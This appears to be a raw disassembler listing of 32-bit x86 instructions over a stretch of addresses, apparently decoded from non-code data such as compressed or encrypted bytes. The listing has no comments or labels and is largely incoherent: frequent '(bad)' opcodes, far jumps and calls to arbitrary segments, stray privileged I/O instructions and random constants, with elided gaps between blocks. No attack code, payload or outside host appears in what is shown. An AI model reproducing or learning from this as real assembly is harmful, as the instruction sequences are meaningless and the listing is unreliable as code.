  42dbd8:	fadd   QWORD PTR [ebx]
  42dbda:	pop    DWORD PTR [edx+0xe8532a3]
  42dbe0:	mov    ecx,0x606d4db1
  42dbe5:	lea    ebx,[edi]
  42dbe7:	push   cs
  42dbe8:	rcr    BYTE PTR [eax-0x9336e8a],1
  42dbee:	dec    esp
  42dbef:	sti    
  42dbf0:	ret    0x2159
  42dbf3:	mov    eax,0xd48b47e4
  42dbf8:	sub    DWORD PTR [ebx+0x1bf4cf1f],esp
  42dbfe:	push   cs
  42dbff:	lds    edi,FWORD PTR ss:[edx+0x22]
  42dc03:	mov    edi,0x4b2884c6
  42dc08:	push   es
  42dc09:	cwde   
  42dc0a:	enter  0x6d14,0x59
  42dc0e:	enter  0xdad8,0x7
  42dc12:	push   eax
  42dc13:	sub    BYTE PTR [ebx],bl
  42dc15:	lods   eax,DWORD PTR ds:[esi]
  42dc16:	clc    
  42dc17:	rcl    BYTE PTR [esp+eax*8],cl
  42dc1a:	pop    edx
  42dc1b:	jne    0x42dc5a
  42dc1d:	int    0xb7
  42dc1f:	and    eax,0xa91745e3
  42dc24:	jmp    0x753aec2d
  42dc29:	aam    0x28
  42dc2b:	dec    ebx
  42dc2c:	push   0x49
  42dc2e:	push   esp
  42dc2f:	jmp    0x147d:0xfbaf37b2
  42dc36:	jo     0x42dc8b
  42dc38:	gs mov ah,0x86
  42dc3b:	xchg   ebx,eax
  42dc3c:	out    dx,al
  42dc3d:	and    ah,BYTE PTR [ebp+edi*2+0x7c]
  42dc41:	fmul   DWORD PTR [ecx+ebp*8]
  42dc44:	xchg   ecx,eax
  42dc45:	rcl    edx,1
  42dc47:	sub    DWORD PTR [eax],ecx
  42dc49:	loope  0x42dc63
  42dc4b:	mov    esi,0x4f1d9985
  42dc50:	(bad)  [ebp-0x1a]
  42dc53:	mov    WORD PTR ds:0x351fe7a6,?
  42dc59:	test   eax,0x19ad0e54
  42dc5e:	(bad)  
  42dc5f:	or     al,BYTE PTR [ecx+edx*8]
  42dc62:	popa   
  42dc63:	popa   
  42dc64:	xchg   ebx,eax
  42dc65:	jnp    0x42dcc6
  42dc67:	jg     0x42dc54
  42dc69:	div    BYTE PTR [esi+0x5042bae8]
  42dc6f:	cld    
  42dc70:	int    0x97
  42dc72:	add    ecx,DWORD PTR [ecx-0xdfb5ba3]
  42dc78:	loope  0x42dcb7
  42dc7a:	xor    dh,bh
  42dc7c:	mov    ds:0x6251c734,al
  42dc81:	pop    ebx
  42dc82:	sar    DWORD PTR [ebp+0x64],0x26
  42dc86:	cs xor eax,0xe04b3c8d
  42dc8c:	out    0x3d,eax
  42dc8e:	ret    
  42dc8f:	test   al,0x95
  42dc91:	mov    ds:0xac6c156d,al
  42dc96:	neg    BYTE PTR [ebx]
  42dc98:	jne    0x42dcff
  42dc9a:	into   
  42dc9b:	loop   0x42dd19
  42dc9d:	pop    es
  42dc9e:	rcr    BYTE PTR [ebp+0x41],cl
  42dca1:	xchg   ecx,edx
  42dca3:	pop    ebx
  42dca4:	push   ss
  42dca5:	and    al,0x43
  42dca7:	jnp    0x42dc89
  42dca9:	pop    edx
  42dcaa:	mov    al,0xb1
  42dcac:	xor    eax,0xd6d80498
  42dcb1:	or     BYTE PTR [edx-0x4296de83],ch
  42dcb7:	sbb    al,0xee
  42dcb9:	les    ebx,FWORD PTR [ebx+0x57ed3dcb]
  42dcbf:	sbb    BYTE PTR [esi+0x0],bh
	...
  42dd31:	add    BYTE PTR [eax],al
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x4ad53752]
  42dd44:	push   ds
  42dd45:	in     al,0x1
  42dd47:	add    ch,dh
  42dd49:	add    BYTE PTR [eax],al
  42dd4b:	add    BYTE PTR [edx+eax*1-0x16894fd5],dl
  42dd52:	aas    
  42dd53:	pop    esp
  42dd54:	test   eax,0xaa597f4f
  42dd59:	aaa    
  42dd5a:	mov    ds:0x42bc6cdf,al
  42dd5f:	dec    eax
  42dd60:	mov    eax,DWORD PTR [eax+0x2c5b6fe7]
  42dd66:	daa    
  42dd67:	or     DWORD PTR [edx-0x1c],eax
  42dd6a:	out    dx,al
  42dd6b:	mov    dl,0x17
  42dd6d:	sbb    cl,BYTE PTR [ebx+0x37f21cc]
  42dd73:	pop    ss
  42dd74:	retf   0x793b
  42dd77:	inc    esp
  42dd78:	sti    
  42dd79:	jne    0x42dd0b
  42dd7b:	aam    0x9c
  42dd7d:	ds inc eax
  42dd7f:	fs xor ah,0xf2
  42dd83:	xor    esp,DWORD PTR [esi+0x23]
  42dd86:	and    eax,0x31fe9536
  42dd8b:	(bad)  
  42dd8d:	lods   eax,DWORD PTR ds:[esi]
  42dd8e:	es pop edi
  42dd90:	push   edx
  42dd91:	add    al,0xa0
  42dd93:	sbb    bh,cl
  42dd95:	cmp    dh,BYTE PTR [ebx-0x6a]
  42dd98:	push   ebp
  42dd99:	adc    dh,BYTE PTR [edx-0x62]
  42dd9c:	pusha  
  42dd9d:	sbb    ebp,esp
  42dd9f:	mov    ds:0x1c41e955,al
  42dda4:	(bad)  
  42dda5:	and    eax,0xee0283ef
  42ddaa:	(bad)  
  42ddab:	fbld   TBYTE PTR [ebp+0x33]
  42ddae:	(bad)  
  42ddb0:	test   eax,0xeb363883
  42ddb6:	popa   
  42ddb7:	das    
  42ddb8:	stos   BYTE PTR es:[edi],al
  42ddb9:	ficomp WORD PTR [esi]
  42ddbb:	mov    DWORD PTR [ebx+0x35d1bbbd],edx
  42ddc1:	xor    eax,0x4275275
  42ddc6:	sbb    dh,BYTE PTR [edi]
  42ddc8:	dec    esi
  42ddc9:	jg     0x42de31
  42ddcb:	dec    ecx
  42ddcc:	cmc    
  42ddcd:	aam    0xc8
  42ddcf:	mul    edx
  42ddd1:	gs dec eax
  42ddd3:	icebp  
  42ddd4:	popf   
  42ddd5:	dec    ebp
  42ddd6:	add    dh,al
  42ddd8:	or     al,0x9f
  42ddda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dddb:	adc    ebx,eax
  42dddd:	mov    dh,0xf3
  42dddf:	sbb    al,0xc2
  42dde1:	inc    esi
  42dde2:	scas   eax,DWORD PTR es:[edi]
  42dde3:	icebp  
  42dde4:	icebp  
  42dde5:	fbstp  TBYTE PTR [ebp+0x57f40f3d]
  42ddeb:	push   edi
  42ddec:	mov    ebp,0xe0cf70e9
  42ddf1:	aaa    
  42ddf2:	ja     0x42de13
  42ddf4:	mov    ebx,0x85828470
  42ddf9:	ja     0x42dde7
  42ddfb:	pop    ds
  42ddfc:	mov    cl,0xc1
  42ddfe:	xchg   ecx,eax
  42ddff:	sub    DWORD PTR [edx-0x242c99c9],0xb2c1cd50
  42de09:	ret    
  42de0a:	dec    esp
  42de0b:	bound  edi,QWORD PTR ds:0x9b61bfbb
  42de11:	repz inc edx
  42de13:	jb     0x42de52
  42de15:	dec    ebp
  42de16:	fsub   DWORD PTR [ecx+ebp*8-0x17]
  42de1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de1b:	enter  0xb248,0xe6
  42de1f:	ins    DWORD PTR es:[edi],dx
  42de20:	sub    DWORD PTR [edx],0x8ee9187c
  42de26:	lea    esi,[ebx]
  42de28:	fiadd  DWORD PTR [edx-0x17]
  42de2b:	imul   edi,DWORD PTR [ecx+0x7],0x8da76e0c
  42de32:	xchg   edx,eax
  42de33:	ret    
  42de34:	outs   dx,BYTE PTR ds:[esi]
  42de35:	adc    cl,0x29
  42de38:	mov    esi,0x1fe031f0
  42de3d:	(bad)  
  42de3e:	dec    edi
  42de3f:	(bad)  
	...
  42deb1:	add    BYTE PTR [eax],al
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0x52fc50c]
  42dec3:	rcl    BYTE PTR [ebx],cl
  42dec5:	in     eax,0x1
  42dec7:	add    ch,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    bl,al
  42decd:	or     dh,bh
  42decf:	gs jp  0x42df0f
  42ded2:	call   0x4bbf8411
  42ded7:	cs adc eax,0x63559a00
  42dedd:	adc    esi,edi
  42dedf:	adc    al,0x1d
  42dee1:	stos   BYTE PTR es:[edi],al
  42dee2:	mov    dh,0x4b
  42dee4:	test   al,0xc9
  42dee6:	adc    eax,0x2853d571
  42deeb:	add    al,0x9
  42deed:	repnz cwde 
  42deef:	and    DWORD PTR [esp+edx*2],ebp
  42def2:	ins    DWORD PTR es:[edi],dx
  42def3:	idiv   bh
  42def5:	mov    ds:0x5cb5d601,eax
  42defa:	fld1   
  42defc:	xchg   esi,eax
  42defd:	fisttp WORD PTR [eax-0x36d9d547]
  42df03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df04:	(bad)  
  42df05:	es leave 
  42df07:	mov    edi,0x69458285
  42df0c:	inc    esi
  42df0d:	mov    al,0x29
  42df0f:	ss push 0x187dd221
  42df15:	ficomp WORD PTR [ebp+0x5892dc98]
  42df1b:	sub    eax,0x34030462
  42df20:	cmp    DWORD PTR [ecx+ebx*8+0x22ea8903],edi
  42df27:	fs jnp 0x42dee6
  42df2a:	xchg   BYTE PTR [ebx-0x42],bh
  42df2d:	ja     0x42debc
  42df2f:	lds    ebp,FWORD PTR [eax]
  42df31:	test   al,0x3e
  42df33:	dec    edi
  42df34:	pop    edx
  42df35:	adc    eax,0x6f701bbe
  42df3a:	cmc    
  42df3b:	in     eax,dx
  42df3c:	mov    ah,0x7d
  42df3e:	and    cl,BYTE PTR [ecx+0x3154004b]
  42df44:	shr    bl,0x6e
  42df47:	xchg   ebx,eax
  42df48:	mov    DWORD PTR [ebx+0x53088166],ecx
  42df4e:	lock xor DWORD PTR [esi],ecx
  42df51:	rcl    ecx,0x2
  42df54:	in     eax,dx
  42df55:	dec    edx
  42df56:	push   ebx
  42df57:	int    0x90
  42df59:	out    0x6a,al
  42df5b:	mov    DWORD PTR [esi],0x5d5c91b0
  42df61:	mov    ch,0xc1
  42df63:	mov    esi,0xc628cf9b
  42df68:	inc    DWORD PTR [ebp+0x7e]
  42df6b:	jmp    0x42df35
  42df6d:	xor    al,0x46
  42df6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df70:	ror    BYTE PTR [ebp+0x6296e605],cl
  42df76:	sub    ch,BYTE PTR [edx-0x19]
  42df79:	dec    edx
  42df7a:	pop    es
  42df7b:	mov    ah,0x1f
  42df7d:	push   edi
  42df7e:	rol    BYTE PTR [ecx],cl
  42df80:	and    eax,0x53f0ee83
  42df85:	sub    ecx,DWORD PTR [eax-0x10]
  42df88:	jecxz  0x42dff6
  42df8a:	or     dh,ah
  42df8c:	dec    ebx
  42df8d:	mov    bh,0x24
  42df8f:	push   edx
  42df90:	test   BYTE PTR cs:[esi-0x6c],dl
  42df94:	sbb    BYTE PTR [ecx-0x34ae8094],dh
  42df9a:	repz or ecx,DWORD PTR [edx+0x3d54320c]
  42dfa1:	lods   al,BYTE PTR ds:[esi]
  42dfa2:	sbb    al,0xb5
  42dfa4:	pusha  
  42dfa5:	adc    DWORD PTR [ecx+0x4a4c93cf],eax
  42dfab:	lds    esi,FWORD PTR [ebx]
  42dfad:	fs jbe 0x42df35
  42dfb0:	jmp    0xe03cb35b
  42dfb5:	aad    0x63
  42dfb7:	inc    esp
  42dfb8:	pop    ebp
  42dfb9:	mov    ds:0xe8fd0d22,eax
  42dfbe:	call   0x0:0x3a8f
	...
  42e031:	add    BYTE PTR [eax],al
  42e033:	add    BYTE PTR [eax+0x3a],dl
  42e036:	(bad)  
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x53c66ae2],0x6e
  42e044:	or     dh,ah
  42e046:	add    DWORD PTR [eax],eax
  42e048:	cmc    
  42e049:	add    BYTE PTR [eax],al
  42e04b:	add    al,ch
  42e04d:	xchg   DWORD PTR gs:[ebp+0xd],ecx
  42e051:	jp     0x42dfdc
  42e053:	sbb    al,0xb
  42e055:	mov    ebp,0x1aa687a5
  42e05a:	ins    BYTE PTR es:[edi],dx
  42e05b:	(bad)  
  42e05c:	repnz inc ebp
  42e05e:	call   0x1e7f:0xb0c66775
  42e065:	js     0x42dff6
  42e067:	sahf   
  42e068:	call   0x350d28a7
  42e06d:	and    DWORD PTR [ebx+0x71],edi
  42e070:	pop    ebx
  42e071:	out    dx,al
  42e072:	and    bh,BYTE PTR [esi-0x7dd21646]
  42e078:	sar    BYTE PTR [ecx-0x3],0xb7
  42e07c:	pop    eax
  42e07d:	push   edi
  42e07e:	ins    DWORD PTR es:[edi],dx
  42e07f:	cmc    
  42e080:	sub    esi,ebx
  42e082:	call   0xebae:0xf634d3d9
  42e089:	fldenv fs:[ecx+0x9]
  42e08d:	mov    edx,edx
  42e08f:	cmc    
  42e090:	pop    es
  42e091:	(bad)  
  42e092:	mov    edx,0x5564cb6
  42e097:	mov    ds:0x82a40077,al
  42e09c:	retf   
  42e09d:	pop    esi
  42e09e:	(bad)  
  42e09f:	xchg   ecx,eax
  42e0a0:	sub    bl,bl
  42e0a2:	dec    esp
  42e0a3:	cmp    ebp,DWORD PTR [ebp+eiz*4-0x10621c11]
  42e0aa:	jmp    0x420f8d2f
  42e0af:	xor    DWORD PTR [ebp+0x74b71931],0x75
  42e0b6:	dec    eax
  42e0b7:	and    esp,0xb409ed51
  42e0bd:	ss jecxz 0x42e129
  42e0c0:	jl     0x42e0dd
  42e0c2:	popf   
  42e0c3:	test   dl,ah
  42e0c5:	mov    eax,ds:0xa647f83f
  42e0ca:	jcxz   0x42e0af
  42e0cd:	(bad)  
  42e0ce:	popa   
  42e0cf:	in     eax,0x2
  42e0d1:	dec    ebp
  42e0d2:	inc    ebx
  42e0d3:	jb     0x42e0dc
  42e0d5:	xchg   esi,eax
  42e0d6:	and    BYTE PTR [edi],dh
  42e0d8:	pop    ebx
  42e0d9:	into   
  42e0da:	nop
  42e0db:	int3   
  42e0dc:	(bad)  
  42e0dd:	(bad)  
  42e0de:	xor    dh,BYTE PTR [esi+0x51bb52e2]
  42e0e4:	push   ss
  42e0e5:	add    DWORD PTR [ecx+ecx*2],0xffffff9b
  42e0e9:	jecxz  0x42e091
  42e0eb:	mov    dl,0x4b
  42e0ed:	add    ch,bh
  42e0ef:	pop    edi
  42e0f0:	fsubr  DWORD PTR [eax]
  42e0f2:	scas   al,BYTE PTR es:[edi]
  42e0f3:	scas   eax,DWORD PTR es:[edi]
  42e0f4:	loop   0x42e0d4
  42e0f6:	rcl    DWORD PTR [edi],1
  42e0f8:	push   esp
  42e0f9:	cs jl  0x42e07f
  42e0fc:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e0fe:	imul   esp,DWORD PTR [esi+0x2e1bd637],0xffffffa5
  42e105:	cmp    BYTE PTR [ebp+0x12],cl
  42e108:	mov    ah,0x3a
  42e10a:	shl    BYTE PTR [edx+0x7ee55cdd],1
  42e110:	fxam   
  42e112:	mov    esp,0x53ae1d51
  42e117:	adc    bh,ah
  42e119:	aam    0xbe
  42e11b:	push   edi
  42e11c:	lds    eax,FWORD PTR [edi+ebp*8]
  42e11f:	fwait
  42e120:	jge    0x42e152
  42e122:	push   esp
  42e123:	clc    
  42e124:	add    DWORD PTR [esi],edx
  42e126:	or     DWORD PTR [edx+eiz*2],edx
  42e129:	stos   DWORD PTR es:[edi],eax
  42e12a:	add    eax,0x2da03559
  42e12f:	ds test al,0xd4
  42e132:	push   es
  42e133:	mov    dh,0xf3
  42e135:	dec    esp
  42e136:	call   0x979e:0x6144cca2
  42e13d:	cld    
  42e13e:	jge    0x42e15c
  42e140:	mov    ebx,0x0
	...
  42e1b1:	add    BYTE PTR [eax],al
  42e1b3:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0x23474871
  42e1c3:	mov    ebx,0x1e6fd
  42e1c8:	cmc    
  42e1c9:	add    BYTE PTR [eax],al
  42e1cb:	add    BYTE PTR [edx],ah
  42e1cd:	ins    BYTE PTR es:[edi],dx
  42e1ce:	cmp    eax,0xb9ee5459
  42e1d3:	xlat   BYTE PTR ds:[ebx]
  42e1d4:	jp     0x42e20a
  42e1d6:	lahf   
  42e1d7:	rol    DWORD PTR ds:[ebx+0x2572de49],cl
  42e1de:	sbb    eax,0x11962aec
  42e1e3:	rcl    BYTE PTR [esi-0x516379c0],cl
  42e1e9:	xor    al,0x38
  42e1eb:	sbb    al,ch
  42e1ed:	aad    0x84
  42e1ef:	mov    DWORD PTR [ecx+0x7b],ecx
  42e1f2:	stc    
  42e1f3:	add    edi,DWORD PTR [ecx-0x2952b6c9]
  42e1f9:	das    
  42e1fa:	xchg   ebx,eax
  42e1fb:	mov    al,0x8b
  42e1fd:	in     al,dx
  42e1fe:	jb     0x42e196
  42e200:	into   
  42e201:	addr16 (bad) 
  42e203:	int3   
  42e204:	mov    ch,0xef
  42e206:	mov    dl,0xef
  42e208:	cmp    al,0x66
  42e20a:	inc    ebp
  42e20b:	inc    ebx
  42e20c:	jns    0x42e250
  42e20e:	test   eax,0xb8112851
  42e213:	inc    edx
  42e214:	pop    ecx
  42e215:	xor    BYTE PTR [eax-0x1d],0x41
  42e219:	mov    ebp,0x8a013d03
  42e21e:	into   
  42e21f:	cs scas eax,DWORD PTR es:[edi]
  42e221:	retf   
  42e222:	cmp    ebp,DWORD PTR [edi-0x7c32e03]
  42e228:	mov    al,0x16
  42e22a:	jecxz  0x42e201
  42e22c:	xchg   edx,eax
  42e22d:	push   ecx
  42e22e:	not    DWORD PTR [ebx+0x6eaf9caa]
  42e234:	inc    BYTE PTR [eax+eiz*4-0x701453f]
  42e23b:	inc    eax
  42e23c:	mov    bh,0x9f
  42e23e:	loop   0x42e281
  42e240:	jmp    0x6ec9:0x85880952
  42e247:	xchg   ecx,eax
  42e248:	push   ss
  42e249:	xchg   ecx,eax
  42e24a:	jmp    0x2537:0x9e241b8b
  42e251:	push   ss
  42e252:	and    BYTE PTR [edi],0x83
  42e255:	xchg   ecx,eax
  42e256:	push   edi
  42e257:	mov    ch,0xb2
  42e259:	mov    eax,ds:0xd86728fe
  42e25e:	dec    DWORD PTR [edx]
  42e260:	sub    BYTE PTR [eax],dl
  42e262:	lods   eax,DWORD PTR ds:[esi]
  42e263:	imul   edi,DWORD PTR [esi],0xfffffffe
  42e266:	rol    BYTE PTR [edi-0x50c2db9],0x41
  42e26d:	shl    DWORD PTR [eax],cl
  42e26f:	pop    es
  42e270:	cmp    al,0x8f
  42e272:	test   DWORD PTR [edi+eax*8-0x5a],ecx
  42e276:	mov    ds:0x40f1ddf0,al
  42e27b:	inc    ebp
  42e27c:	outs   dx,BYTE PTR ds:[esi]
  42e27d:	cmp    ch,BYTE PTR [esi]
  42e27f:	push   ebp
  42e280:	test   esi,0x3457de6d
  42e286:	jp     0x42e2f8
  42e288:	dec    ebx
  42e289:	bnd js 0x42e23c
  42e28c:	iret   
  42e28d:	xor    ecx,DWORD PTR [ebx]
  42e28f:	dec    edi
  42e290:	stos   BYTE PTR es:[edi],al
  42e291:	and    eax,0xf94bfe78
  42e296:	push   0xffffffcb
  42e298:	aaa    
  42e299:	jne    0x42e2cd
  42e29b:	ins    BYTE PTR es:[edi],dx
  42e29c:	(bad)  
  42e29d:	test   edi,0x97f6aab1
  42e2a3:	stc    
  42e2a4:	addr16 dec edi
  42e2a6:	enter  0x924c,0x20
  42e2aa:	mov    dl,0xb1
  42e2ac:	loopne 0x42e285
  42e2ae:	mov    bl,0x1b
  42e2b0:	push   ebx
  42e2b1:	dec    edi
  42e2b2:	dec    ebp
  42e2b3:	std    
  42e2b4:	enter  0x8173,0xca
  42e2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2b9:	mov    bl,0x34
  42e2bb:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42e2bd:	sbb    DWORD PTR [ecx+0x3c],0xe2
	...
  42e334:	ror    esi,0x63
  42e337:	cdq    
  42e338:	outs   dx,DWORD PTR ds:[esi]
  42e339:	mov    ebp,0x5146defb
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [edi-0x7],ecx
  42e342:	ins    BYTE PTR es:[edi],dx
  42e343:	pop    eax
  42e344:	repnz out 0x1,eax
  42e347:	add    ch,dh
  42e349:	add    BYTE PTR [eax],al
  42e34b:	add    BYTE PTR [ecx+0x17],ch
  42e34e:	sar    cl,cl
  42e350:	inc    bh
  42e352:	(bad)  
  42e353:	lock and DWORD PTR [eax+0x30],0x3f
  42e358:	enter  0x3d08,0xdd
  42e35c:	call   FWORD PTR [eax-0x55a8f7d7]
  42e362:	and    cl,BYTE PTR [esi-0x7e]
  42e365:	mov    dl,0x78
  42e367:	mov    WORD PTR [ebx-0x2b1cc488],ss
  42e36d:	pop    ss
  42e36e:	dec    eax
  42e36f:	cwde   
  42e370:	pop    ds
  42e371:	and    bl,BYTE PTR [ecx+0x1f15e270]
  42e377:	sbb    ah,BYTE PTR [ebx]
  42e379:	sahf   
  42e37a:	add    DWORD PTR [ebx+0x37608902],eax
  42e380:	(bad)  
  42e381:	dec    ebx
  42e382:	add    ch,BYTE PTR [ecx+0x53674568]
  42e388:	pop    esp
  42e389:	add    eax,0x66
  42e38c:	and    eax,0x895f10cc
  42e391:	fmul   st(0),st
  42e393:	(bad)  
  42e394:	(bad)  [edi+eiz*1]
  42e397:	jmp    0x42e386
  42e399:	xchg   esi,eax
  42e39a:	xchg   ecx,eax
  42e39b:	adc    DWORD PTR ds:0x6a1b15e7,eax
  42e3a1:	and    al,0x2b
  42e3a3:	fs cwde 
  42e3a5:	sti    
  42e3a6:	imul   esi,DWORD PTR [eax+0x1a],0x5b44d732
  42e3ad:	outs   dx,BYTE PTR ds:[esi]
  42e3ae:	dec    ecx
  42e3af:	pop    edi
  42e3b0:	pop    ebx
  42e3b1:	dec    ebp
  42e3b2:	adc    BYTE PTR [edx-0x557893d7],dl
  42e3b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3ba:	ss ret 0xc2cc
  42e3be:	or     al,dh
  42e3c0:	cmp    al,0x40
  42e3c2:	(bad)  
  42e3c3:	fldcw  WORD PTR [edi-0x4d5e301f]
  42e3c9:	loopne 0x42e35b
  42e3cb:	leave  
  42e3cc:	and    eax,0xf39df1b9
  42e3d1:	lds    ebx,FWORD PTR [ecx-0x5b143589]
  42e3d7:	outs   dx,DWORD PTR ds:[esi]
  42e3d8:	sbb    DWORD PTR [eax-0x5b0306a3],ecx
  42e3de:	lods   al,BYTE PTR ds:[esi]
  42e3df:	nop
  42e3e0:	out    dx,eax
  42e3e1:	and    BYTE PTR [esp+ebp*8],ch
  42e3e4:	(bad)  
  42e3e5:	lds    esp,FWORD PTR [esi+0x5c]
  42e3e8:	push   ecx
  42e3e9:	(bad)  
  42e3ea:	adc    BYTE PTR [esp+edi*8],dl
  42e3ed:	xchg   esi,eax
  42e3ee:	pop    ss
  42e3ef:	popa   
  42e3f0:	dec    edi
  42e3f1:	sbb    DWORD PTR [edi+edx*4],0x4bbfedb8
  42e3f8:	inc    esi
  42e3f9:	mov    cl,0x81
  42e3fb:	sub    BYTE PTR [ebp+ecx*2-0x12],dl
  42e3ff:	mov    ebx,0xd1e0edd8
  42e404:	xlat   BYTE PTR ds:[ebx]
  42e405:	int3   
  42e406:	pop    es
  42e407:	retf   0xcc17
  42e40a:	sbb    dl,BYTE PTR [ecx]
  42e40c:	call   0xe749:0x6b87395d
  42e413:	mov    bh,0x78
  42e415:	xchg   esp,eax
  42e416:	push   0x40
  42e418:	jl     0x42e3f5
  42e41a:	xor    al,0x57
  42e41c:	mov    ebp,0x515eabb3
  42e421:	pop    ebx
  42e422:	or     eax,DWORD PTR ds:0xbcb276d1
  42e428:	sub    dh,ah
  42e42a:	arpl   WORD PTR ds:0x1d6e1b73,si
  42e430:	fst    DWORD PTR [bx+si-0x12]
  42e434:	imul   DWORD PTR [esi-0x76]
  42e437:	cmp    al,0x27
  42e439:	sub    bh,bl
  42e43b:	sbb    DWORD PTR [esi+0x1329576c],0x0
	...
  42e4b1:	add    BYTE PTR [eax],al
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0x92a0044c
  42e4c4:	out    0xe8,eax
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	cmc    
  42e4c9:	add    BYTE PTR [eax],al
  42e4cb:	add    BYTE PTR [edi+0x67d6918c],cl
  42e4d1:	das    
  42e4d2:	out    dx,eax
  42e4d3:	xor    esi,DWORD PTR [edi-0x5773ea1d]
  42e4d9:	push   es
  42e4da:	bound  esi,QWORD PTR [ebp+ebp*2-0x21bcce1e]
  42e4e1:	(bad)  
  42e4e2:	xchg   edx,eax
  42e4e3:	mov    esi,0x22f0eb08
  42e4e8:	std    
  42e4e9:	pop    ebx
  42e4ea:	and    BYTE PTR [edi],al
  42e4ec:	(bad)  
  42e4ed:	mov    eax,ds:0xe2eedee9
  42e4f2:	loope  0x42e481
  42e4f4:	pop    edx
  42e4f5:	mov    al,BYTE PTR [edx]
  42e4f7:	(bad)  
  42e4f8:	mov    ah,0xf2
  42e4fa:	adc    esi,0x79
  42e4fd:	gs xchg esi,eax
  42e4ff:	cli    
  42e500:	mov    ah,0xf0
  42e502:	mov    esi,0x522fc26e
  42e507:	push   esp
  42e508:	inc    ebx
  42e509:	adc    DWORD PTR [edx+0x76126a7f],ecx
  42e50f:	test   eax,0xc98dedcd
  42e514:	adc    cl,BYTE PTR [edx+0x25]
  42e517:	add    eax,0xe689da2a
  42e51c:	out    0x9f,eax
  42e51e:	add    ah,bh
  42e520:	push   cs
  42e521:	cmp    bh,bl
  42e523:	mov    dh,0xb
  42e525:	stos   DWORD PTR es:[edi],eax
  42e526:	test   al,0x92
  42e528:	outs   dx,DWORD PTR ds:[esi]
  42e529:	dec    ebp
  42e52a:	push   edi
  42e52b:	(bad)  
  42e52c:	fnsave [edi-0x79]
  42e52f:	(bad)  
  42e530:	xchg   esi,eax
  42e531:	aam    0xc
  42e533:	retf   
  42e534:	pop    edi
  42e535:	loop   0x42e57c
  42e537:	mov    ecx,0x1ea1b9ef
  42e53c:	pusha  
  42e53d:	nop
  42e53e:	xchg   ecx,eax
  42e53f:	(bad)  
  42e541:	fistp  DWORD PTR [ecx+0x1bb01f32]
  42e547:	jbe    0x42e4d8
  42e549:	and    bl,cl
  42e54b:	adc    esi,DWORD PTR [edx-0x2392ab78]
  42e551:	sub    al,0x5e
  42e553:	test   DWORD PTR [edx+0x26b9dfbf],ecx
  42e559:	push   0x1ec20ebd
  42e55e:	inc    edi
  42e55f:	mov    ds:0x72cab3af,eax
  42e564:	popf   
  42e565:	sbb    ebp,edx
  42e567:	mov    ch,0xd5
  42e569:	jbe    0x42e502
  42e56b:	fidivr DWORD PTR [edi]
  42e56d:	(bad)  
  42e56f:	cmp    ah,BYTE PTR [eax]
  42e571:	cmp    BYTE PTR [edx],0x6e
  42e574:	mov    eax,ds:0x9c01815a
  42e579:	imul   esi,DWORD PTR ds:0xea535821,0x31
  42e580:	in     al,dx
  42e581:	in     eax,0x70
  42e583:	adc    dl,BYTE PTR [ecx]
  42e585:	popa   
  42e586:	pop    ss
  42e587:	xor    BYTE PTR [edi],cl
  42e589:	dec    esp
  42e58a:	stos   BYTE PTR es:[edi],al
  42e58b:	xchg   edx,eax
  42e58c:	jmp    0x42e5af
  42e58e:	ins    BYTE PTR es:[edi],dx
  42e58f:	push   ecx
  42e591:	ds das 
  42e593:	or     al,0x56
  42e595:	or     esp,DWORD PTR [ebp+0x3d]
  42e598:	jge    0x42e53d
  42e59a:	xchg   ebx,eax
  42e59b:	jecxz  0x42e534
  42e59d:	icebp  
  42e59e:	push   cs
  42e59f:	sbb    eax,DWORD PTR [esi]
  42e5a1:	lods   al,BYTE PTR ds:[esi]
  42e5a2:	das    
  42e5a3:	int    0x8
  42e5a5:	aaa    
  42e5a6:	or     DWORD PTR [edx+0x4a],0x20
  42e5aa:	lahf   
  42e5ab:	repz pop ebp
  42e5ad:	fcom   QWORD PTR [ebx]
  42e5af:	push   esi
  42e5b0:	xchg   ebx,eax
  42e5b1:	sbb    ecx,DWORD PTR [esi+esi*8]
  42e5b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e5b5:	bound  ebx,QWORD PTR [ecx]
  42e5b7:	inc    esi
  42e5b8:	jge    0x42e551
  42e5ba:	push   esi
  42e5bb:	dec    ebx
  42e5bc:	test   al,0x5
  42e5be:	mov    dl,0xb9
  42e5c0:	mov    edx,0x0
	...
  42e631:	add    BYTE PTR [eax],al
  42e633:	add    bl,dh
  42e635:	add    esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	pop    edx
  42e641:	inc    ecx
  42e642:	cmp    esp,ebp
  42e644:	fsub   st(1),st
  42e646:	add    DWORD PTR [eax],eax
  42e648:	cmc    
  42e649:	add    BYTE PTR [eax],al
  42e64b:	add    BYTE PTR [ebx],dl
  42e64d:	fs jecxz 0x42e635
